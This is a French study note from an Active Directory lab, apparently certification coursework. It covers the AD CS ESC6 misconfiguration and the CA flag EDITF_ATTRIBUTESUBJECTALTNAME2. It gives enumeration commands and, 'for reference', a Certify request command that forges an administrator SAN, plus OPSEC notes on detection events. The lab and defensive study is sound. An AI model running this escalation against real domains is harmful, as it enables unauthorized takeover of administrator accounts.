---
flag: 35
machine: dcorp-dc
statut: à faire
technique: ADCS-ESC6
LO: "[[LO21 - AD CS (ESC1 et ESC3)]]"
---

# F35 · Attribut CA autorisant les SAN

> [!summary] Objectif
> Nommer l'attribut / flag de la **CA elle-même** qui permet au demandeur de fournir un `Subject Alternative Name` arbitraire, même sur un template qui ne l'autorise pas.

## Contexte
- **Etape attack flow**: variante ESC6 — même effet qu'ESC1 mais le flag est au niveau CA (`EDITF_*`) et non au niveau template. N'importe quel template client-auth devient alors exploitable.
- **Ce qu on a**: énumération AD CS depuis un simple Domain User.
- **Ce qu on cherche**: le **nom exact du flag** dans `EditFlags` de la CA.

## Solution

### Etape 1: Enumerer la CA et regarder EditFlags
```powershell
C:\AD\Tools\Certify.exe cas
```
Dans la sortie, chercher la ligne `User Specified SAN` / `EditFlags` sur la CA. Si `EDITF_ATTRIBUTESUBJECTALTNAME2` est listé → CA vulnérable ESC6.

### Etape 2: Verification alternative (certutil natif)
```powershell
certutil -config "<CA_HOST>\<CA_NAME>" -getreg "policy\EditFlags"
```
Le bit `0x00040000` = `EDITF_ATTRIBUTESUBJECTALTNAME2`.

### Etape 3 (exploitation — pour référence)
```powershell
# Même sur un template sans ENROLLEE_SUPPLIES_SUBJECT, on peut forcer le SAN
C:\AD\Tools\Certify.exe request /ca:<CA> /template:<ANY_CLIENT_AUTH_TEMPLATE> /altname:administrator
```

## Reponse

| Element | Valeur |
|---------|--------|
| Nom du flag CA | `EDITF_ATTRIBUTESUBJECTALTNAME2` |
| CA concernée | <A REMPLIR DEPUIS LAB> |

## Pieges et OPSEC
- Ne pas confondre avec `ENROLLEE_SUPPLIES_SUBJECT` (flag **template** → F33). Ici c'est un flag **CA** = plus large et plus dangereux (tous les templates deviennent exploitables).
- Certify signale la CA `[!] User Specified SAN: EDITF_ATTRIBUTESUBJECTALTNAME2` dans `cas` — si absent, la CA n'est pas ESC6.
- Trace : Event **4886/4887** avec un SAN qui ne matche pas le requestor → très bruyant.

## Refs
- [[Cheatsheet - AD CS et certificats]]
- [[Synthèse - AD CS]]
- [[LO21 - AD CS (ESC1 et ESC3)]]
- [[Attaques AD]]

> [!note] Commande absente cheatsheet
> `certutil -config ... -getreg policy\EditFlags` n'existe pas encore dans [[Cheatsheet - AD CS et certificats]] — à ajouter en phase suivante.
